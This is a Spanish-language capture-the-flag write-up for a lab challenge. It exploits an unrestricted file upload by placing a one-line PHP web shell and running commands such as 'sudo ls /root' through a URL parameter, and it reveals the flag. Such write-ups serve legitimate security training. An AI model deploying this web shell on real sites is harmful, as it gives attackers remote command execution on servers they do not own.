**Descripción:**
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. You can access the web application [here](http://chatelaine.cylabacademy.net:17874/)!
**Solución 1:**
voy al sitio web y veo que puedo subir la imagen par un perfil :
![[Pasted image 20261003230747.png]]
luego inspeccionando un poco el html de la pagina

![[Pasted image 20261003230822.png]]
y veo que en la linea 11 recibe un archivo .php, entonces podemos hacer una inyección de codigo, entonces creo un archivo .php con el siguiente contenido
![[Pasted image 20261003231239.png]]
<?php system($_GET['cmd']); ?>

despues vamos al sitio subimos el perfil y nos encontramos  con que fue subido
![[Pasted image 20261003231523.png]]
vamos a la ruta que nos dice y le agregamos el parametro cmd de nuestro archivo y vamos a :
http://chatelaine.cylabacademy.net:17874/uploads/shell.php?cmd=id

si nos dirigimos a http://chatelaine.cylabacademy.net:17874/uploads/shell.php?cmd=sudo%20-l
![[Pasted image 20261003232025.png]]
podemos ver los permisos
probando cosas gracias a nuestro script podemos ir a la ruta de raiz
![[Pasted image 20261003232320.png]]
http://xebec.cylabacademy.net:40005/uploads/shell.php?cmd=sudo%20ls%20/root
y nos dice que existe un flag.txt
![[Pasted image 20261003232512.png]]
y nos lleva a la bandera:
academy{wh47_c4n_u_d0_wPHP_12aa2ff5}
**Solución 2:**

**Referencias:**  
https://www.youtube.com/watch?v=duP8S-IqVuQ

**Notas:**